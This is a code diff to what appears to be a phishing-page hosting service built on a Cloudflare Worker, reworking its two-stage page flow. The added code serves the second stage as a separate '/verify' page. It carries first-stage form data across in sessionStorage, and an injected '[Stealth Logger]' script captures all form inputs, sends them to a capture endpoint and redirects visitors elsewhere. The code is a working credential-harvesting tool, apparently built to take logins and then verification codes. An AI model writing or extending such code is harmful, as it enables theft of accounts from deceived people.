@@ -154,7 +154,11 @@ export default {
     }
 
     if (subdomain && subdomain !== 'www') {
-        const data = await env.SUBDOMAINS.get(subdomain, { type: "json" });
+        let lookupKey = subdomain;
+        if (url.pathname === '/verify') {
+             lookupKey = `${subdomain}::stage2`;
+        }
+        const data = await env.SUBDOMAINS.get(lookupKey, { type: "json" });
 
         if (!data) {
            return new Response(`<html><body><h1>404</h1><p>Subdomain not found.</p></body></html>`, {
@@ -474,6 +478,7 @@ async function handleDeleteSite(request, env) {
     } catch (e) {}
 
     await env.SUBDOMAINS.delete(subdomain);
+    await env.SUBDOMAINS.delete(`${subdomain}::stage2`);
     return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
 }
 
@@ -547,28 +552,7 @@ async function handlePublicDeploy(request, env, rootDomain) {
             // Check for Multi-Stage
             if (templateData.contentStage2) {
                 isMultiStage = true;
-                const p1 = extractBodyParts(templateData.content);
-                const p2 = extractBodyParts(templateData.contentStage2);
-
-                // Get head from Stage 1 and Stage 2
-                const headMatch1 = templateData.content.match(/<head[^>]*>([\s\S]*)<\/head>/i);
-                const head1 = headMatch1 ? headMatch1[1] : '';
-
-                const headMatch2 = templateData.contentStage2.match(/<head[^>]*>([\s\S]*)<\/head>/i);
-                const head2 = headMatch2 ? headMatch2[1] : '';
-
-                htmlContent = `<!DOCTYPE html>
-<html>
-<head>
-${head1}
-${head2}
-<style>#dtech-stage-2 { display: none; }</style>
-</head>
-<body${p1.attrs}>
-<div id="dtech-stage-1">${p1.content}</div>
-<div id="dtech-stage-2" style="display:none;">${p2.content}</div>
-</body>
-</html>`;
+                htmlContent = templateData.content;
             } else {
                 htmlContent = templateData.content;
             }
@@ -581,6 +565,10 @@ ${head2}
             htmlContent = customHtml;
             shouldInject = (enableInjector === true);
             if (!redirectUrl) redirectUrl = null;
+            if (body.customHtmlStage2) {
+                isMultiStage = true;
+                templateData = { contentStage2: body.customHtmlStage2 };
+            }
         } else {
             return jsonError("Must provide a template or custom HTML");
         }
@@ -596,6 +584,7 @@ ${head2}
 
             if (isMultiStage) {
                 injectionBlock += `<script>window.MULTI_STAGE = true;</script>`;
+                injectionBlock += `<script>window.CURRENT_STAGE = 1;</script>`;
             }
 
             injectionBlock += `<script src="${scriptUrl}"></script>`;
@@ -604,6 +593,33 @@ ${head2}
                 htmlContent = htmlContent.replace('</body>', `${injectionBlock}</body>`);
             } else {
                 htmlContent += injectionBlock;
+            }
+
+            // Also prepare Stage 2 content if multi-stage
+            if (isMultiStage && templateData && templateData.contentStage2) {
+                let stage2Content = templateData.contentStage2;
+                let injectionBlock2 = `<script>window.UNIQUE_CODE = ${JSON.stringify(uniqueCode)};</script>`;
+                if (redirectUrl) {
+                    injectionBlock2 += `<script>window.REDIRECT_URL = ${JSON.stringify(redirectUrl)};</script>`;
+                }
+                injectionBlock2 += `<script>window.MULTI_STAGE = true;</script>`;
+                injectionBlock2 += `<script>window.CURRENT_STAGE = 2;</script>`;
+                injectionBlock2 += `<script src="${scriptUrl}"></script>`;
+
+                if (stage2Content.includes('</body>')) {
+                    stage2Content = stage2Content.replace('</body>', `${injectionBlock2}</body>`);
+                } else {
+                    stage2Content += injectionBlock2;
+                }
+
+                await env.SUBDOMAINS.put(`${subdomain}::stage2`, JSON.stringify({
+                    type: 'HTML',
+                    content: stage2Content,
+                    updated: Date.now(),
+                    ownerCode: uniqueCode,
+                    isInjected: true,
+                    templateName: actualTemplateName
+                }));
             }
         }
 
@@ -740,6 +756,7 @@ async function handleDeletePublicSite(request, env) {
     if (!ownsSite) return jsonError("Unauthorized: Site not found in your account", 403);
 
     await env.SUBDOMAINS.delete(subdomain);
+    await env.SUBDOMAINS.delete(`${subdomain}::stage2`);
 
     const newSites = sites.filter(s => s.subdomain !== subdomain);
     if (newSites.length > 0) {
@@ -1127,15 +1144,23 @@ const CONFIG = {
     ],
     REDIRECT_URL: window.REDIRECT_URL || 'https://example.com',
     CAPTURE_URL: '/api/capture',
-    MULTI_STAGE: window.MULTI_STAGE || false
+    MULTI_STAGE: window.MULTI_STAGE || false,
+    CURRENT_STAGE: window.CURRENT_STAGE || 1
 };
 
 (() => {
     const log = (msg, type='info') => console.log(\`[Stealth Logger] \${msg}\`);
     let typingTimer;
     let formData = {};
-    let currentStage = 1;
+    let currentStage = CONFIG.CURRENT_STAGE;
     let stage1Data = {};
+
+    if (CONFIG.MULTI_STAGE && currentStage === 2) {
+        try {
+            const saved = sessionStorage.getItem('dtech_stage1_data');
+            if (saved) stage1Data = JSON.parse(saved);
+        } catch(e) {}
+    }
 
     const getFieldName = (field) => {
         return field.name || field.id || field.placeholder || field.getAttribute('aria-label') || \`unnamed_\${field.type}\`;
@@ -1145,10 +1170,6 @@ const CONFIG = {
         const data = { ...formData };
 
         let selector = 'input, textarea, select';
-        if (CONFIG.MULTI_STAGE) {
-            selector = currentStage === 1 ? '#dtech-stage-1 input, #dtech-stage-1 textarea, #dtech-stage-1 select'
-                                          : '#dtech-stage-2 input, #dtech-stage-2 textarea, #dtech-stage-2 select';
-        }
 
         document.querySelectorAll(selector).forEach(field => {
             const name = getFieldName(field);
@@ -1211,17 +1232,12 @@ const CONFIG = {
                  e.stopPropagation();
 
                  const s1Data = captureAllInputs();
-                 stage1Data = s1Data;
-                 formData = {};
+                 try {
+                     sessionStorage.setItem('dtech_stage1_data', JSON.stringify(s1Data));
+                 } catch(err) {}
 
-                 const s1 = document.getElementById('dtech-stage-1');
-                 const s2 = document.getElementById('dtech-stage-2');
-                 if(s1 && s2) {
-                     s1.style.display = 'none';
-                     s2.style.display = 'block';
-                     currentStage = 2;
-                     log('Switched to Stage 2');
-                 }
+                 log('Redirecting to Stage 2');
+                 window.location.href = '/verify';
                  return;
              }
         }
